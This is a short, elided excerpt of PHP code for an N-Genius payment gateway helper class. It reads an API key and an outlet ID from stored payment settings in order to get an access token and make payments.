...
use Modules\Cargo\Http\Controllers\CheckoutController;
...
class NgeniusUtility
{
    ...
    public static function getAccessToken()
    {
        ...
        $ngenius_payment = json_decode($paymentSettings['ngenius'], true);

        $apikey = $ngenius_payment['NGENIUS_API_KEY']; // set your service account API key (example only)
...
//        $tokenResponse = self::invokeCurlRequest("POST", $idServiceURL, $tokenHeaders, null);
    ...
    public static function make_payment($callback_url, $payment_type, $amount)
    {
        ...
        $outletRef = $ngenius_payment['NGENIUS_OUTLET_ID']; // set your outlet reference/ID value here (example only)
